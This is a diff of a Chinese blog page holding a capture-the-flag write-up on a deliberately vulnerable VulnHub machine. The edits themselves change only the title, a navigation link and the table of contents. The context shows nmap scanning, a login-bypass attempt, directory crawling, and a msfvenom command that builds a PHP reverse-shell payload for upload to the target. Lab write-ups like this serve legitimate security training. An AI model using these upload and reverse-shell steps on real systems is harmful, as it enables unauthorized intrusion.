@@ -184,7 +184,7 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <h1 id="JIS-CTF靶机渗透笔记"><a href="#JIS-CTF靶机渗透笔记" class="headerlink" title="JIS-CTF靶机渗透笔记"></a>JIS-CTF靶机渗透笔记</h1><p>最近闲来无事，一直在找CTF的题目来看，觉得挺有意思的，然后看到了这个靶机环境，觉得不错，于是便有了此篇，文章不提供任何专业技术，仅仅是我闹着玩打的<br>，环境可以点这个<a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/" target="_blank" rel="noopener">链接</a>下载，因为下载的格式是ova的，所以直接导入vm就完事了<br><img src="http://t1.aixinxi.net/o_1cgjd62dh2of1kk1f3s8pa1u18a.png-j.jpg" alt=""></p>
+                <p>最近闲来无事，一直在找CTF的题目来看，觉得挺有意思的，然后看到了这个靶机环境，觉得不错，于是便有了此篇，文章不提供任何专业技术，仅仅是我闹着玩打的<br>，环境可以点这个<a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/" target="_blank" rel="noopener">链接</a>下载，因为下载的格式是ova的，所以直接导入vm就完事了<br><img src="http://t1.aixinxi.net/o_1cgjd62dh2of1kk1f3s8pa1u18a.png-j.jpg" alt=""></p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>因为靶机是进不去的，所以我们先用nmap来找到靶机的ip地址<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -vv -sn <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> | grep -B <span class="number">1</span> 'Host is up'</span><br></pre></td></tr></table></figure></p>
 <p><img src="http://t1.aixinxi.net/o_1cgjftcio1lh1fcc1bdt1mi31a7aa.png-j.jpg" alt=""><br>这里因为直接nmap后会出现很多东西，不方便查找，所以直接用grep把相应的东西打印出来，方便看，可以看到总共有4个存活的ip，其中1为网关，112是我的win10,201是kali，103是我手机，所以排除法得出，118为靶机ip地址，我们再用nmap来扫描一下开启了什么服务<br><img src="http://t1.aixinxi.net/o_1cgjg0me1gk4utq1pqu16hhvpa.png-j.jpg" alt=""><br>通过上图可以看出，22端口是开启了SSH服务，80端口是开启了http服务，先来查看一下网站<br><img src="http://t1.aixinxi.net/o_1cgjg4ba31v4d14eufc91jsr1dq9a.png-j.jpg" alt=""><br>查看源代码没有发现什么提示，不管，放一边，看看SSH有没有什么漏洞，我这里使用的是searchsploit工具来看openssh有没有可利用的点<br><img src="http://t1.aixinxi.net/o_1cgjhfvv8ckn12q71ak4uel15g1a.png-j.jpg" alt=""><br>找到了用户名枚举的漏洞，我觉得没什么用，算了，去看网站那边有没有可以利用的<br>看地址栏可以看出网站是php，想起了常见的搭配，php+mysql，这里用万能密码看能不能绕过<br><img src="http://t1.aixinxi.net/o_1cgjhpff6vtj1ive1gj3g0g1pgia.png-j.jpg" alt=""><br>nice，果然没有，算了，一般来说web的点，在源代码里面都会有提示，所以先去把网站目录爬一遍，burpsuite是自带子目录枚举功能<br><img src="http://t1.aixinxi.net/o_1cgma2utg1189b5q1bhq1c5d1ig1a.png-j.jpg" alt=""><br>通过firefox的wappalyzer插件可以看到网站的后端语言为php，去到config选项卡，我们设置为只枚举php的页面<br><img src="http://t1.aixinxi.net/o_1cgma3ldk1uv91ejh1po21mhdjl4a.png-j.jpg" alt=""><br><img src="http://t1.aixinxi.net/o_1cgma4jmu39b6vf18b9lon165ua.png-j.jpg" alt=""><br>点击开始后，burpsuite就会把网站子目录差不多的给爬出来了，在左边可以看到admin_area这个文件，点进去后就可以看到页面源文件藏着账号密码和flag了<img src="http://t1.aixinxi.net/o_1cgma5rlkq301igf1a0d1l121hoga.png-j.jpg" alt=""><img src="http://t1.aixinxi.net/o_1cgmafpbs82u1ejuqpm9361u0a.png-j.jpg" alt="此处输入图片的描述"></p>
 <h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>我们拿刚才得到的用户名密码，登录进去，可以看到是一个上传界面<br><img src="http://t1.aixinxi.net/o_1cgmab97q37c9fv1c8p1dabtnia.png-j.jpg" alt="">随意上传了一个php文件发现成功，于是用msfvenom来生成一个php文件<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --payload php/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=192.168.1.201 <span class="attribute">LPORT</span>=4123 --format<span class="built_in"> raw </span>--out /etc/Elapse.php</span><br></pre></td></tr></table></figure></p>
@@ -201,8 +201,8 @@
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2018/06/29/新坑/" data-toggle="tooltip" data-placement="top"
-                           title="正在开新坑中.....">&larr; Previous Post</a>
+                        <a href="/2018/06/29/JIS-CTF BOB靶机渗透笔记/" data-toggle="tooltip" data-placement="top"
+                           title="JIS-CTF BOB靶机渗透笔记">&larr; Previous Post</a>
                     </li>
                     
                     
@@ -224,7 +224,7 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JIS-CTF靶机渗透笔记"><span class="toc-text">JIS-CTF靶机渗透笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web渗透"><span class="toc-text">web渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#靶机网络配置（连接不了看这里）"><span class="toc-text">靶机网络配置（连接不了看这里）</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web渗透"><span class="toc-text">web渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#靶机网络配置（连接不了看这里）"><span class="toc-text">靶机网络配置（连接不了看这里）</span></a></li></ol>
                 </div>
             </div>
         </div>
